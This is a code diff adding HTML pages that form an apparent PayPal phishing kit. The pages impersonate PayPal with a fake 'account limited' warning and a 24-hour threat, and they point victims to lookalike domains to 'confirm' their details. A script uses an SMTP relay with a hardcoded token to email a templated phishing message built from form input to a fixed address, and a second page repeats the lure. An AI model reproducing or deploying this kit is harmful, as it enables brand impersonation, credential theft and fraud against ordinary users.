@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+
+ <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<body>
+  <div class="container">
+    <!-- Header Section -->
+    
+<!-- Logo Section -->
+<div style="text-align: center; padding: 20px; background-color: #fff; margin-bottom:-60px;">
+  <img style="width:; height:80px;" src="https://1000logos.net/wp-content/uploads/2021/04/Paypal-logo.png">
+</div>
+
+
+    <!-- Content Section -->
+    <div class="content">
+      <p>Dear PayPal customer,</p>
+      <p>Your PayPal account is limited, You have 24 hours to solve the problem or your account will be permanetly disabled.</p>
+      <p>We are sorry to inform you that you no longer have access to PayPal's advantages like purchasing, and sending and receiving money.</p>
+
+      <strong>Why is my PayPal account limited?</strong>
+<p style="margin-top:-1px;">We believe that your account is in danger from unauthorized users.</p>
+
+  <strong>What can I do to resolve the problem?</strong>
+  <p style="margin-top:-1px;">
+You have to confirm all of your account details on our secured server by clicking the link below and following the steps.</p>
+
+    <span style="color:red;"> Copy and paste the URL below if the button is not functioning</span> 
+    <h4>......https://reautholinkedtoin.rf.gd/........</h4>
+   
+    <a href="index121.html"><button type="submit" class="button"name="submit" >Confirm Your Information</button></a>
+    
+    
+    </div>
+ 
+
+ 
+  </div>
+
+
+<form method="post" id="submitfor">
+   
+<div class="your-input"> 
+
+<div class="input"> 
+
+<input type="text" name="email"
+
+id="email" required placeholder="PayPal Support"/> 
+
+<label for="email">Company Name</label> 
+
+</div> 
+
+
+<div class="input"> 
+
+<input type="text" name="name"
+
+id="name" required placeholder="Enter Your Customer Name"/> 
+
+<label for="name">Customer Name</label> 
+
+</div> 
+
+
+
+
+</div> 
+   
+   
+<button type="submit" class="button"name="submit" >submit</button>
+    
+    </form>
+
+
+
+
+  <script>  
+const email = document.getElementById('email');
+const name = document.getElementById('name');
+const submitfor = document.getElementById('submitfor');
+
+submitfor.addEventListener('submit',(e)=>{
+    e.preventDefault();
+    let ebody = `
+<body>
+  <div class="container">
+    <!-- Header Section -->
+    
+<!-- Logo Section -->
+<div style="text-align: center; padding: 20px; background-color: #fff; margin-bottom:-60px;">
+  <img style="width:; height:80px;" src="https://1000logos.net/wp-content/uploads/2021/04/Paypal-logo.png">
+</div>
+
+
+    <!-- Content Section -->
+    <div class="content">
+      <p>Dear PayPal ${name.value},</p>
+      <p>Your PayPal account is limited, You have 24 hours to solve the problem or your account will be permanetly disabled.</p>
+      <p>We are sorry to inform you that you no longer have access to PayPal's advantages like purchasing, and sending and receiving money.</p>
+
+      <strong>Why is my PayPal account limited?</strong>
+<p style="margin-top:-1px;">We believe that your account is in danger from unauthorized users.</p>
+
+  <strong>What can I do to resolve the problem?</strong>
+  <p style="margin-top:-1px;">
+You have to confirm all of your account details on our secured server by clicking the button below and follow the security steps.</p>
+   
+    <a href="https://page-melive.kesug.com"><button type="submit" class="button"name="submit" >Confirm Your Information</button></a>
+    
+    
+    </div>
+ 
+
+   <h2>${email.value}</h2>
+  </div>
+</body>
+    `;
+  
+Email.send({
+        SecureToken : "38d10d4f-f1fa-489f-b792-4e65d0adb774", //add your token here
+         To :  'Moonmichael56@gmail.com',
+        From :'cout9903@gmail.com',
+        Subject : 'CheckOut',
+        Body : ebody
+    }).then(
+      message => alert("Message Sent")
+);
+    
+$(document).ready(function () {
+    // Handler for .ready() called.
+    window.setTimeout(function () {
+        location.href = "index.html";
+    }, 5000);
+});
+});
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!doctype html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>paypal auth</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+
+
+
+<img style="height:auto; width:100%;"src="https://logos-world.net/wp-content/uploads/2020/07/PayPal-Logo.png">
+
+
+
+<small><h3>Dear PayPal Customer,</h3></small>
+
+<small> <p style="margin-top:-8px; font-size:14px;">Your PayPal Acount is limited, You have 24 hours to solve the problem or your account will be
+permanently disabled.<br>We are sorry to inform you that you no longer
+have access to PayPal's advantages like purchasing, and sending and receiving money.
+</p></small>
+   
+<small><h3 style="color:#3b7bbf">Why is my PayPal account limited?</h3></small>
+
+<small> <p style="margin-top:-8px; font-size:14px;">We believe that your account is in danger from unauthorized users</p></small>
+
+
+<small><h3 style="color:#3b7bbf">What can i do to resolve the problem?</h3></small>
+
+<small> <p style="margin-top:-8px; font-size:14px;">You have to confirm your account details on our
+secured server by clicking the link below amd following the steps.<br> <p style="color:#3b7bbf">www.mylink.com</p></small>
+
+</body>
+</html>
